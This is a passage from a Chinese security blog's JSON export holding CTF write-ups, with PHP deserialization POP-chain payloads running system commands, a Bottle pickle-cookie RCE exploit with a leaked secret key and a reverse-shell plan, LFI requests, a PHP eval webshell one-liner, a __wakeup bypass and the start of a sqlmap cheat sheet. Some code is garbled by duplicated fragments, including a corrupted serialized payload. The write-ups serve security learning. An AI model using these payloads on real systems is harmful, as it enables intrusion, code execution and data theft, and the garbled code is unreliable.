show\n&#123;\n    public $ctf;\n    public $time = \"Two and a half years\";\n\n    public function __construct($ctf)\n    &#123;\n        $this->ctf = $ctf;\n    &#125;\n\n\n    public function __toString()\n    &#123;\n        return $this->ctf->show();\n //show类有this->ctf->show() 联想一下__call函数，或者看看其他类有show函数没，在secret_code类中发现有show函数，而其函数内语句会触发__get魔术，而__get魔术会触发fine类的__invoke魔术，其中的call_user_func就是实现反序列化命令执行的关键，所以这里并不触发__call魔术\n    &#125;\n\n    public function show(): string\n    &#123;\n        return $this->ctf . \": Duration of practice: \" . $this->time;\n    &#125;\n\n\n&#125;\n\nclass sorry\n&#123;\n    private $name;\n    private $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n\n    public function __construct($name, $password)\n    &#123;\n        $this->name = $name;\n        $this->password = $password;\n    &#125;\n\n    public function __sleep()\n    &#123;\n        $this->hint = new secret_code();\n    &#125;\n\n    public function __get($name)\n    &#123;\n        $name = $this->key;\n        $name();\n//sorry类的__get函数有$name()，联想到__invoke，fine类的__invoke 函数有call_user_func函数，也就是突破口\n    &#125;\n\n\n    public function __destruct()\n    &#123;\n        if ($this->password == $this->name) &#123;\n    //这里的password和name就需要外部实例化后赋值为相同的，因为这样才能通过下面语句调用魔术方法，而不执行else语句\n            echo $this->hint;\n        //sorry的析构函数有echo $this->hint 联想一下__toString函数，在Show类中\n        &#125; else if ($this->name = \"jay\") &#123;\n            secret_code::secret();\n        &#125; else &#123;\n            echo \"This is our code\";\n        &#125;\n    &#125;\n\n\n    public function getPassword()\n    &#123;\n        return $this->password;\n    &#125;\n\n    public function setPassword($password): void\n    &#123;\n        $this->password = $password;\n    &#125;\n\n\n&#125;\n\nclass secret_code\n&#123;\n    protected $code;\n\n    public static function secret()\n    &#123;\n        include_once \"hint.php\";\n        hint();\n    &#125;\n\n    public function __call($name, $arguments)\n    &#123;\n        $num = $name;\n        $this->$num();\n    &#125;\n\n    private function show()\n    &#123;\n        return $this->code->secret;  \n//secret_code类的show函数有this->code->secret，secret属性是所有类都没有的，自然联想到__get，在Sorry类里\n    &#125;\n&#125;\n\n\nif (isset($_GET[&#x27;pop&#x27;])) &#123;\n    $a = unserialize($_GET[&#x27;pop&#x27;]);\n    $a->setPassword(md5(mt_rand()));\n&#125; else &#123;\n    $a = new show(\"Ctfer\");\n    echo $a->show();\n&#125;\n\n\n\n\n\n\n\n\n\n\n\n\npop链的构造\n切入口 sorry类的析构函数，突破口fine类的__invoke函数中的call_user_func函数\nsorry.__destruct -&gt; show.__toString-&gt;secret.show()-&gt;sorry.__get() -&gt; fine.__invoke()-&gt;call_user_func函数\n#call_user_func(a,b) — 把第一个参数作为回调函数调用, 其余参数是回调函数的参数#也就是把a当作函数，把b当作传入a函数的参数【如call_user_func(assert,phpinfo()),就会执行代码phpinfo()】\n所以payload为\n\nclass fine\n&#123;\n    public $cmd;\n    public $content;\n&#125;\nclass show\n&#123;\n    public $ctf;\n    public $time = \"Two and a half years\";\n&#125;\nclass sorry\n&#123;\n    public $name;\n    public $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n&#125;\n\nclass secret_code\n&#123;\n    public $code;\n&#125;\n$Fine = new fine();\n$Show = new show();\n$Sorry = new sorry();\n$Sorry2 = new sorry();\n//这里实例化两次sorry是因为当，脚本运行完毕后，会执行__destruct()魔术方法，从而清空了变量引用，也就相当于关闭了这个类，\n//但是后续还需要调用其中的魔术方法，所以需要再次实例化，并重新为password和name相同赋值\n$Secret = new secret_code();\n\n$Sorry->name = &#x27;cc&#x27;;\n$Sorry->password = &#x27;cc&#x27;;\n$Sorry->hint = $Show;\n$Show->ctf = $Secret;\n$Secret->code = $Sorry2;\n\n$Sorry2->name = &#x27;cc&#x27;;\n$Sorry2->password = &#x27;cc&#x27;;\n$Sorry2->key = $Fine;\n$Fine->cmd = &#x27;system&#x27;;\n$Fine->content = &#x27;ls /&#x27;;\n$a = serialize($Sorry);\necho $a\n?>\n\n\n\n补充：另一种写法，一定要url编码，因为里边有不可见字符。\n\nclass fine\n&#123;\n    private $cmd;\n    private $content;\n    public function __construct($cmd, $content)\n    &#123;\n        $this->cmd = $cmd;\n        $this->content = $content;\n    &#125;\n&#125;\nclass show\n&#123;\n    public $ctf;\n    public $time = \"Two and a half years\";\n    public function __construct($ctf, $time)\n    &#123;\n        $this->ctf = $ctf;\n        $this->time = $time;\n    &#125;\n&#125;\nclass sorry\n&#123;\n    private $name;\n    private $password;\n    public $hint = \"hint is depend on you\";\n    public $key;\n    public function __construct($name, $password,$hint,$key)\n    &#123;\n        $this->name = $name;\n        $this->password = $password;\n        $this->hint  = $hint;\n        $this->key = $key;\n    &#125;\n&#125;\nclass secret_code\n&#123;\n    protected $code;\n    public function __construct($code)\n    &#123;\n        $this->code = $code;\n    &#125;\n&#125;\n$Sorry= new sorry(&#x27;cc&#x27;,&#x27;cc&#x27;,new show(new secret_code(new sorry(&#x27;cc&#x27;,&#x27;cc&#x27;,&#x27;cc&#x27;,new fine(&#x27;system&#x27;,&#x27;ls&#x27;))),&#x27;cc&#x27;),&#x27;cc&#x27;);\n\n//因为这里没有修改变量修饰，\n//对于private修饰变量无法直接传参，需要实例化类xx(a,b)，然后才能成功传参，当然public类也可以用这种方法传参，只是没必要，但这里是用了的\n//比如sorry类中name和password变量赋值为cc后，后面实例化的show类就是赋值给public hint变量，是按变量声明顺序来进行赋值的\n//这里的嵌套就是同上面的payload一样，只是把变量赋值为实例化的类，实例化类的里面再嵌入变量值和其他实例化的类\n\n$c = serialize($Sorry);\necho urlencode($c);\n?>\n","slug":"2022DASCTF X GFCTF十月挑战赛-wp","date":"2023-02-13T15:19:34.978Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"ba0cf5d51c9ce53698d64b464314f97e","title":"Sekai CTF 2022","content":"国外比赛难度确实逆天\n\n\nSekai CTF 2022https://github.com/project-sekai-ctf/sekaictf-2022\n这是官方的wp和题目的docker，我后面还是把web都复现一下\n\n大比赛，每个题要么难出头，要么感觉就差一点，与大佬的差距，鼠鼠只能赛后复现wp了\n\n这是web难度【看起来就是按解题人数来分】\n1.bottle-poem[后续学习了，补上自己的思路]hint：\n\nCome and read poems in the bottle.\n\nNo bruteforcing is required to solve this challenge. Please do not use scanner tools. Rate limiting is applied. Flag is executable on server.\n\n翻译：\n\n快来读一读瓶中的诗吧。\n\n解决这一挑战不需要暴力破解。请不要使用扫描仪工具。应用速率限制。标志在服务器上是可执行的。\n\n这道题我已经秃头了，开始觉得是单纯的文件包含，但是后面看到官方发的wp，感觉又没那么简单\n我先直接展示官方的wp，然后再展示我复现的过程\nHey guys Thx for attending SekaiCTF  i made two challenges for this competition one is bottle poem another Hey guys Thx for attending SekaiCTF  i made two challenges for this competition one is bottle poem another is sekaigame start\n\nfor the bottle poem most of people think its guessy and at the start the challenge always down  so say sorry to u and respect to my buddy hfz that he fix this challenge \n\nhere is my short wp\n-----------------\nit&#x27;s easy to find that this website has LFI\nu wanna to  read file directly but failed \nthat&#x27;s not show u that we hide it  that means u havent enough execute permission to read it (so we update description that flag is executable and u dont need some bruteforcing or guessing)flag is in the common path /flag\n\nso we need to read source\njust like this\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/app.py\n\nso dont need to bruteforce proc/self/ just use it to got sourcecode\n\nuse this way u can read the secret --sekai\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py\n\nnow u can control the cookies but if u read something just like /views/admin.html or just make guest to admin u would find its a troll \n\nso u need rce truely if u search some documentation will find the bottle&#x27;s cookie_decode() will unpickle so use this to get rce\nhttps://github.com/bottlepy/bottle/issues/900\n\nhere the steps\n1.lfi to read file and    secret\n2.use cookie pickle rce to reverse a shell\n3.execute /flag to get flag\n---------\nand my exp \n-------------\ndemo exp\nimport base64,hashlib,pickle,hmac\nimport os\ndef tob(s, enc=&#x27;utf8&#x27;):\n    if isinstance(s, str):\n        return s.encode(enc)\n    return b&#x27;&#x27; if s is None else bytes(s)\n\n\ndef cookie_encode(data, key):\n    &#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;\n    msg = base64.b64encode(pickle.dumps(data, 0))\n    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())\n    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msg\n\nclass test():\n    def __reduce__(self):\n        return (eval,(&#x27;__import__(\"os\").popen(\"command\")&#x27;,))\n\n\nobj = test()\na = cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)\nprint(a)\n\n翻译\n大家好，感谢参加 SekaiCTF 我为这次比赛提出了两个挑战，一个是瓶子诗，另一个是 sekaigame start\n\n对于瓶子诗，大多数人认为它是猜测性的，一开始挑战总是失败，所以向你说声抱歉，并尊重我的好友 hfz，他解决了这个挑战\n\n这是我的简短 wp\n-----------------\n很容易发现这个网站有LFI（本地文件包含）\n你想直接读取文件但失败了\n这并没有告诉你我们隐藏它，这意味着你没有足够的执行权限来读取它（所以我们更新了标志是可执行的并且你不需要一些暴力破解或猜测的描述）标志在公共路径/标志中\n\n所以我们需要阅读源码\n像这样\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/app.py\n\n所以不需要蛮力 proc/self/ 只需使用它来获取源代码\n\n使用这种方式你可以阅读秘密--sekai\n\nhttp://bottle-poem.ctf.sekai.team/show?id=/proc/self/cwd/config/secret.py\n\n现在您可以控制 cookie，但如果您阅读 /views/admin.html 之类的内容，或者只是让访客成为管理员，您会发现它是一个巨魔（可以理解为恶搞）\n\n所以你真的需要 rce 如果你搜索一些文档会发现瓶子的 cookie_decode() 会解开所以用它来获取 rce\nhttps://github.com/bottlepy/bottle/issues/900\n\n这里的步骤\n1.lfi读取文件和秘密\n2.使用cookie pickle rce 反弹一个shell\n3.执行/flag获取flag\n\n官方exp\ndemo exp\nimport base64,hashlib,pickle,hmac\nimport os\ndef tob(s, enc=&#x27;utf8&#x27;):\n    if isinstance(s, str):\n        return s.encode(enc)\n    return b&#x27;&#x27; if s is None else bytes(s)\n\n\ndef cookie_encode(data, key):\n    &#x27;&#x27;&#x27; Encode and sign a pickle-able object. Return a (byte) string &#x27;&#x27;&#x27;\n    msg = base64.b64encode(pickle.dumps(data, 0))\n    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())\n    return tob(&#x27;!&#x27;) + sig + tob(&#x27;?&#x27;) + msg\n\nclass test():\n    def __reduce__(self):\n        return (eval,(&#x27;__import__(\"os\").popen(\"command\")&#x27;,))\n\n\nobj = test()\na = cookie_encode(obj,&#x27;Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu&#x27;)\nprint(a)\n\n\n下面是我复现理解操作\n先打开网站，看到有三个可以打开的链接\n\n先看看源码\n\n发现没什么额外的信息，三个链接是对应着三个文本文件\n看起来似乎是文件包含的题\nhttp://bottle-poem.ctf.sekai.team/show?id=spring.txt\n\n\n我们试试能不能显示其他信息，我在做的时候试的是/etc/passwd\nhttp://bottle-poem.ctf.sekai.team/show?id=/etc/passwd\n\n\n看来是方向对了，确实是可以包含本地文件并显示，但是没有其他信息能利用\n*查看当前进程的启动命令这个是看最后发的wp，学到了\n/proc/self/cmdline\n\n//该文件包含的是该进程的命令行参数，包括进程的启动路径(argv[0])\n\n然后会下载一个名叫show的文件\npython3 -u /app/app.py\n\n在命令中，我们发现运行了一个/app/app.py的文件\n看来这就是我们网站启动的脚本，里面就有我们网站的源码\nhttp://bottle-poem.ctf.sekai.team/show?id=/app/app.py\n\n查看到文件源码\nfrom bottle from bottle import route, run, template, request, response, error\nfrom config.secret import sekai\nimport os\nimport re\n\n\n@route(\"/\")\ndef home():\n    return template(\"index\")\n\n\n@route(\"/show\")\ndef index():\n    response.content_type = \"text/plain; charset=UTF-8\"\n    param = request.query.id\n    if re.search(\"^../app\", param):\n        return \"No!!!!\"\n    requested_path = os.path.join(os.getcwd() + \"/poems\", param)\n    try:\n        with open(requested_path) as f:\n            tfile = f.read()\n    except Exception as e:\n        return \"No This Poems\"\n    return tfile\n\n\n@error(404)\ndef error404(error):\n    return template(\"error\")\n\n\n@route(\"/sign\")\ndef index():\n    try:\n        session = request.get_cookie(\"name\", secret=sekai)\n        if not session or session[\"name\"] == \"guest\":\n            session = &#123;\"name\": \"guest\"&#125;\n            response.set_cookie(\"name\", session, secret=sekai)\n            return template(\"guest\", name=session[\"name\"])\n        if session[\"name\"] == \"admin\":\n            return template(\"admin\", name=session[\"name\"])\n    except:\n        return \"pls no hax\"\n\n\nif __name__ == \"__main__\":\n    os.chdir(os.path.dirname(__file__))\n    run(host=\"0.0.0.0\", port=8080)\n\n在\nfrom config.secret from config.secret import sekai\n\n看到config.secret，这是个文件路径/config/secret\n我们可以访问看看，能不能看到里面的内容【注意这个文件肯定是在 /app目录下】\nhttp://bottle-poem.ctf.sekai.team/show?id=/app/config/secret.py\n\n得到\nsekai = \"Se3333KKKKKKAAAAIIIIILLLLovVVVVV3333YYYYoooouuu\"\n\n\n\n\n1. lfi 读取文件和秘密\n2. 使用 cookie pickle rce 反弹shell\n3. 执行./flag获取flag\n\n根据官方的pickle rce，这个涉及新的 pickle 反序列化技巧\n【流下没技术的眼泪】可我现在只会php反序列化，后面补上\n\n2.sekai-game-start\ninclude(&#x27;./flag.php&#x27;);\nclass Sekai_Game&#123;\n    public $start = True;  \n    public function __destruct()&#123;\n        if($this->start === True)&#123;\n            echo \"Sekai Game Start Here is your flag \".getenv(&#x27;FLAG&#x27;);\n        &#125;\n    &#125;\n    public function __wakeup()&#123;\n        $this->start=False;    \n \n    &#125;\n&#125;\nif(isset($_GET[&#x27;sekai_game.run&#x27;]))&#123;\n    unserialize($_GET[&#x27;sekai_game.run&#x27;]);\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n\n?>\n\n看起来是到反序列化的题目，看起来似乎难度不大，但是我被瓶子诗卡了太久，这几天又在搞DC5，后面的题目发布出来都没怎么看了，早知道做一下了【哭唧唧】\n我们先简单的分析一下源码内容\n\ninclude(&#x27;./flag.php&#x27;);    //文件包含，把当前目录flag.php文件\nclass Sekai_Game&#123;\n    public $start = True;//给strat变量赋值为True\n    public function __destruct()&#123;\n        if($this->start === True)&#123;\n            echo \"Sekai Game Start Here is your flag \".getenv(&#x27;FLAG&#x27;);\n            //getenv函数 用来获取php 环境变量\n        &#125;\n    &#125;\n    public function __wakeup()&#123;\n        $this->start=False;\n//这里又把start变量赋值为False，所以这里是需要绕过__wakeup魔术方法，不让其执行，只用把属性个数改得大于原来就行\n    &#125;\n&#125;\nif(isset($_GET[&#x27;sekai_game.run&#x27;]))&#123;\n    unserialize($_GET[&#x27;sekai_game.run&#x27;]);  //这里就是序列化的变量，变量名为sekai_game.run\n&#125;else&#123;\n    highlight_file(__FILE__);\n&#125;\n\n?>\n\n然后我们整理一下\n得到我们的序列化的php代码\n\nclass Sekai_Game&#123;\n    public $start = True;  \n&#125;\n\n$a=new Sekai_Game();\necho serialize($a);\n\n?>\n\n运行得到序列化结果\nO:10:\"Sekai_Game\":1:&#123;s:5:\"start\";b:1;&#125;\n\n我们修改一下属性值\nO:10:\"Sekai_Game\":2:&#123;s:5:\"start\";b:1;&#125;\n\n【苦笑】但实际是不行的\n关键考点但是\n\nPhP 变量不能使用 . ，但是这个变量名很特殊：sekai_game.run. 它同时具有 _ 和 . \n\nphp默认将.所有参数名称转换为_，因为版本早于8，有一种方法可以解决这个问题，使用[ ，php忽略所有 . ，只转换[为_参数 ==> ?sekai[game.run=\n\n**学到了**\n\n所以有效的payload为\nurl/?sekai[game.run=xxx\n\n\n\n第二步是绕过__wakeup\n这里我用\nO:10:\"Sekai_Game\":2:&#123;s:5:\"start\";b:1;&#125;\n\n实际还是绕不过__wakeup函数，就算是属性个数大于原来的属性个数\n\n==>网上找了以后，发现这个方法是有局限性的，对于高版本的php，这样是无法绕过__wakeup()\n----\n\n对于高版本的php\n可以用C:来绕过\n\n原理是C:代表这个类实现了serializeable接口，而serializeable不支持__wakeup，就绕过去了\n==>\nC:10:\"Sekai_Game\":2:&#123;s:5:\"start\";b:1;&#125;\n\n\n但是因为源码中已经赋值，所以不填写数据，\n只用实例化Sekai_Game类\n\n\n\n\nclass Sekai_Game&#123;\n&#125;\n\n$a=new Sekai_Game();\necho serialize($a);\n\n?>\n\n\n==>O:10:\"Sekai_Game\":0:&#123;&#125;\n==>C:10:\"Sekai_Game\":0:&#123;&#125;\n\n\n\n于是最后的payload为\n?sekai[game.run=C:10:\"Sekai_Game\":0:&#123;&#125;\n\n\n\n\n得到flag\n","slug":"2022SekaiCTF","date":"2023-02-13T15:13:06.374Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"8d801008e226a8eb98ad443ed169bddb","title":"NewStarCTF2022公开赛-wp","content":"没啥简介\n\n\nNewStarCTF2022公开赛虽然是别人学校的新生赛，难度不是很高，但是还是有许多值得学习的知识点\n1.NotPHP\nerror_reporting(0);\nhighlight_file(__FILE__);\nif(file_get_contents($_GET[&#x27;data&#x27;]) == \"Welcome to CTF\")&#123;\n    if(md5($_GET[&#x27;key1&#x27;]) === md5($_GET[&#x27;key2&#x27;]) && $_GET[&#x27;key1&#x27;] !== $_GET[&#x27;key2&#x27;])&#123;\n        if(!is_numeric($_POST[&#x27;num&#x27;]) && intval($_POST[&#x27;num&#x27;]) == 2077)&#123;\n            echo \"Hack Me\";\n            eval(\"#\".$_GET[&#x27;cmd&#x27;]);\n        &#125;else&#123;\n            die(\"Number error!\");\n        &#125;\n    &#125;else&#123;\n        die(\"Wrong Key!\");\n    &#125;\n&#125;else&#123;\n    die(\"Pass it!\");\n&#125;\n\n这里绕过不细讲，都是常见的\neval(&quot;#&quot;.$_GET[eval(&quot;#&quot;.$_GET[&#x27;cmd&#x27;]);\n\n细讲这个\n这个是一个eval函数，但是里面其实已经被#给注释掉了，\n所以无论输入什么都没结果\n\n因此需要闭合或者绕过#\n但是我试了很多闭合方式，结果都没反应\n最后发现\n?>\n\n实现了语句闭合，\n但是，当把这个php结尾符加到后面时候，这个php就就结束了\n以\neval(&quot;#&quot;.$_GET[eval(&quot;#&quot;.$_GET[&#x27;cmd&#x27;]);\n\n为例子\nurl/xxx&cmd=?>haha\n\n当我们闭合了php代码后，那后面的haha的位置在哪里呢\n\n我们可以看到，haha变成了html代码\n那么就可以操作了，\n比如xss，一句话🐎的插入等\nxss我试了，没有结果，现在的xss利用层面和危害也不高了（可能是我技术不到位）\n\n插入一句话🐎\n开始因为是html，我是试了jsp一句话\n&lt;script language=&quot;php&quot;&gt;&lt;script language=&quot;php&quot;&gt;@eval($_POST[\"cmd\"]);\n\n但是用蚁剑连不上\n最后按照传统思路，我在后面插入php一句话\n&lt;?php @eval($_POST[&quot;cmd&quot;]);&lt;?php @eval($_POST[&quot;cmd&quot;]);?>\n\n好家伙，传统思路，才是真\n连接成功拿到flag\n\n不知道有没有看到这篇文章的同学看到这个wp，提醒一下，这里需要在http body里补充num请求信息\n因为这也是绕过的一个环节\n\n\n2.UnserializeOne一道popchain，这还是我第一次做popchain类【惭愧，不过做着真有意思】\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start&#123;\n    public $name;\n    protected $func;\n\n    public function __destruct()\n    &#123;\n        echo \"Welcome to NewStarCTF, \".$this->name;\n    &#125;\n\n    public function __isset($var)\n    &#123;\n        ($this->func)();\n    &#125;\n&#125;\n\nclass Sec&#123;\n    private $obj;\n    private $var;\n\n    public function __toString()\n    &#123;\n        $this->obj->check($this->var);\n        return \"CTFers\";\n    &#125;\n\n    public function __invoke()\n    &#123;\n        echo file_get_contents(&#x27;/flag&#x27;);\n    &#125;\n&#125;\n\nclass Easy&#123;\n    public $cla;\n\n    public function __call($fun, $var)\n    &#123;\n        $this->cla = clone $var[0];\n    &#125;\n&#125;\n\nclass eeee&#123;\n    public $obj;\n\n    public function __clone()\n    &#123;\n        if(isset($this->obj->cmd))&#123;\n            echo \"success\";\n        &#125;\n    &#125;\n&#125;\n\nif(isset($_POST[&#x27;pop&#x27;]))&#123;\n    unserialize($_POST[&#x27;pop&#x27;]);\n&#125;\n\n构造pop链主要在于，\n把我们需要触发的魔术方法联系在一起，而且在联系触发过程中也要记得实例化目标类，这样才能调用和执行其中的方法\n\n\n\n我们先中每个类其中的魔术方法列出来看看，再分析一下\nStart\nclass class Start&#123;\n    public $name;\n    protected $func;\n\n    public function __destruct()\n     //__destruct()，对象被销毁时触发，也就是最后运行结束时触发\n    &#123;\n        echo \"Welcome to NewStarCTF, \".$this->name;\n      //这里进行echo $this->name，如果$this->name是一个类就会调用Sec()类里__toString()\n    &#125;\n\n    public function __isset($var)\n   //__isset()，当对不可访问属性调用isset()或empty()时调用\n    &#123;\n        ($this->func)();\n        //这里把$this->func当作一个函数，执行$this->func()\n        //如果$this->func不是一个正确的函数名，就会调用Sec类里__invoke()\n    &#125;\n&#125;\n\nSec\nclass class Sec&#123;\n    private $obj;\n    private $var;\n\n    public function __toString()\n  //__toString()，把类当做字符串时触发，\n  //所以在Start类中的[echo \"Welcome to NewStarCTF, \".$this->name;]，就需要把name值赋值为Sec类名\n    &#123;\n        $this->obj->check($this->var);\n       //这里想调用this->obj的check方法\n        return \"CTFers\";\n    &#125;\n\n    public function __invoke()\n     //__invoke()，当脚本尝试将对象调用为函数时触发\n   //所以在Start类中的[$this->func)();]中，需要把func值赋值为Sec，从而把其当作函数执行时，从而触其魔术方法\n    &#123;\n        echo file_get_contents(&#x27;/flag&#x27;);\n      //这里就是目标，执行文件包含flag输出内容\n    &#125;\n&#125;\n\nEasy\nclass class Easy&#123;\n    public $cla;\n\n    public function __call($fun, $var)\n   //__call()，在对象上下文中调用不可访问的方法时触发\n   //所以在Sec类中，当this->obj赋值为Easy类时，调用check方法时，就会触发，因为Easy里没有check函数\n    &#123;\n        $this->cla = clone $var[0];\n        //这里调用clone，当对象完成复制时会执行eeee里的__clone\n    &#125;\n&#125;\n\neeee\nclass class eeee&#123;\n    public $obj;\n\n    public function __clone()\n    &#123;\n        if(isset($this->obj->cmd))&#123;\n            //这里是对$this->obj的cmd属性使用isset函数，但是并不存在cmd属性\n            //所以把this->obj赋值为Strat类名，从而触发__isset\n            echo \"success\";\n        &#125;\n    &#125;\n&#125;\n\n\n\n整理一下\nStart::__destruct\n\n==>\n\nSec::__toString\n\n==>\n\nEasy::__call\n\n==>\n\neeee::__clone\n\n==>\n\nStart::__isset\n\n==>\n\nSec::__invoke\n\n于是payload为\n\nerror_reporting(0);\nhighlight_file(__FILE__);\n#Something useful for you : https://zhuanlan.zhihu.com/p/377676274\nclass Start\n&#123;\n    public $name;\n    public $func;\n&#125;\n\nclass Sec\n&#123;\n    public $obj;\n    public $var;\n&#125;\n\nclass Easy\n&#123;\n    public $cla;\n&#125;\n\nclass eeee\n&#123;\n    public $obj;\n&#125;\n\n$start=new Start();\n$sec=new Sec();\n$easy=new Easy();\n$eeee=new eeee();\n\n$start->name=$sec;\n$start->func=$sec;\n\n$sec->obj=$easy;\n$sec->var=$eeee;\n\n$eeee->obj=$start;\n//因为这里把eeee里的变量复制为实例化的Start的类，所以如果从eeee类为开始序列化的入口也是可以的\n\necho serialize($start);\n//echo serialize($eeee);\n\n得到序列化数据，post传入就行\nO:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;r:1;&#125;&#125;s:4:&quot;func&quot;;r:O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;r:1;&#125;&#125;s:4:&quot;func&quot;;r:2;&#125;\n\n//O:4:\"eeee\":1:&#123;s:3:\"obj\";O:5:\"Start\":2:&#123;s:4:\"name\";O:3:\"Sec\":2:&#123;s:3:\"obj\";O:4:\"Easy\":1:&#123;s:3:\"cla\";N;&#125;s:3:\"var\";r:1;&#125;s:4:\"func\";r:3;&#125;&#125;\n\n\n\n","slug":"2022NewStarCTF","date":"2023-02-13T15:07:34.783Z","categories_index":"网络安全学习","tags_index":"Game","author_index":"Ttoc"},{"id":"4497d51e9ba49087760c38d70069b58c","title":"htbのMachines","content":"Machines\n\n\nMachines【WEB】Stocker[easy]个人感觉新东西太多，难度对于开始可能中上 \n请先了解学习\n\n\n\n\n\n\n\n\n\nNoSQL注入\napi利用\n通过iframe利用xss，用伪协议读取文件\n","slug":"htb(Machines)","date":"2023-02-13T14:10:53.464Z","categories_index":"Hack the Box","tags_index":"htb","author_index":"Ttoc"},{"id":"6e2bc51a8d48429972bd10fd836dd7b5","title":"sqlmap使用总结","content":"\n\n\n\n\n\n\n\n\n原文作者: Ywc\n原文链接: https://yinwc.github.io/2018/07/05/tooluse(sqlmap)/\n发表日期: July 5th 2018, 1:20:40 pm\n版权声明:\n\n\nsqlmap使用总结选项–version 显示程序的版本号并退出-h, –help 显示此帮助消息并退出-v VERBOSE 详细级别：0-6（默认为1）\nTarget(目标)以下至少需要设置其中一个选项，设置目标 URL。\n-d DIRECT 直接连接到数据库。\n-u URL, –url=URL 目标 URL。\n-l LIST 从 Burp 或 WebScarab 代理的日志中解析目标。\n-r REQUESTFILE 从一个文件中载入 HTTP 请求。\n-g GOOGLEDORK 处理 Google dork 的结果作为目标 URL。\n-c CONFIGFILE 从 INI 配置文件中加载选项。\n\nRequest（请求）这些选项可以用来指定如何连接到目标URL。\n–data=DATA 通过 POST 发送的数据字符串\n–cookie=COOKIE HTTP Cookie 头\n–cookie-urlencode URL 编码生成的 cookie 注入\n–drop-set-cookie 忽略响应的 Set –Cookie 头信息\n–user-agent=AGENT 指定 HTTP User –Agent 头\n–random-agent 使用随机选定的 HTTP User-Agent 头\n–referer=REFERER 指定 HTTP Referer 头\n–headers=HEADERS 换行分开，加入其他的 HTTP 头\n–auth-type=ATYPE HTTP 身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)\n–auth-cred=ACRED HTTP 身份验证凭据（用户名:密码）\n–auth-cert=ACERT HTTP 认证证书（key_file，cert_file）\n–proxy=PROXY 使用 HTTP 代理连接到目标 URL\n–proxy-cred=PCRED HTTP 代理身份验证凭据（用户名：密码）\n–ignore-proxy 忽略系统默认的 HTTP 代理\n–delay=DELAY 在每个 HTTP 请求之间的延迟时间，单位为秒\n–timeout=TIMEOUT 等待连接超时的时间（默认为30 秒）\n–retries=RETRIES 连接超时后重新连接的时间（默认3）\n–scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式\n–safe-url=SAFURL 在测试过程中经常访问的 url 地址\n–safe-freq=SAFREQ 两次访问之间测试请求，给出安全的 URL\n\nOptimization（优化）这些选项可用于优化 sqlmap.py 的性能。\n-o 开启所有优化开关\n–predict-output 预测常见的查询输出\n–keep-alive 使用持久的 HTTP(S) 连接\n–null-connection 从没有实际的 HTTP 响应体中检索页面长度\n–threads=THREADS 最大的 HTTP(S) 请求并发量（默认为1）\n\nInjection（注入）这些选项可以用来指定测试哪些参数，提供自定义的注入 payloads 和可选篡改脚本。\n-p TESTPARAMETER 可测试的参数\n–dbms=DBMS 强制后端的 DBMS 为此值\n–os=OS 强制后端的 DBMS 操作系统为这个值\n–prefix=PREFIX 注入 payload 字符串前缀\n–suffix=SUFFIX 注入 payload 字符串后缀\n–tamper=TAMPER 使用给定的脚本篡改注入数据\n–tamper 通过编码绕过 WEB 防火墙（WAF）sqlmap.py 默认用 char()\n–tamper 插件所在目录\\sqlmap-dev\\tamper\n\nDetection（检测）这些选项可以用来指定在 SQL 盲注时如何解析和比较 HTTP 响应页面的内容\n–level=LEVEL 执行测试的等级（1-5，默认为 1）\n–risk=RISK 执行测试的风险（0-3，默认为 1）\n–string=STRING 查询有效时在页面匹配字符串\n–regexp=REGEXP 查询有效时在页面匹配正则表达式\n–text-only 仅基于文本内容比较网页\n\n这些选项可用于调整具体的 SQL 注入测试\n–technique=TECH SQL 注入技术测试（默认 BEUST）\nTechniques（技巧）：\n–technique /*测试指定注入类型\\使用的技术\n\n不加参数默认测试所有注入技术：\n不加参数默认测试所有注入技术：\nB: 基于布尔的 SQL 盲注\nE: 基于显错 sql 注入\nU: 基于 UNION 注入\nS: 叠层 sql 注入\nT: 基于时间盲注\n\n\n\n–time-sec=TIMESEC DBMS 响应的延迟时间（默认为 5 秒）\n–union-cols=UCOLS 定列范围用于测试 UNION 查询注入\n–union-char=UCHAR 用于暴力猜解列数的字符\n\nFingerprint（指纹）-f, –fingerprint 执行检查广泛的 DBMS 版本指纹\n\nEnumeration（枚举）这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行您自己的 SQL 语句。\n-b, –banner 检索数据库管理系统的标识\n–current-user 检索数据库管理系统当前用户\n–current-db 检索数据库管理系统当前数据库\n–is-dba 检测 DBMS 当前用户是否 DBA\n–users 枚举数据库管理系统用户\n–passwords 枚举数据库管理系统用户密码哈希\n–privileges 枚举数据库管理系统用户的权限\n–roles 枚举数据库管理系统用户的角色\n–dbs 枚举数据库管理系统数据库\n–tables 枚举 DBMS 数据库中的表\n–columns 枚举 DBMS 数据库表列\n–dump 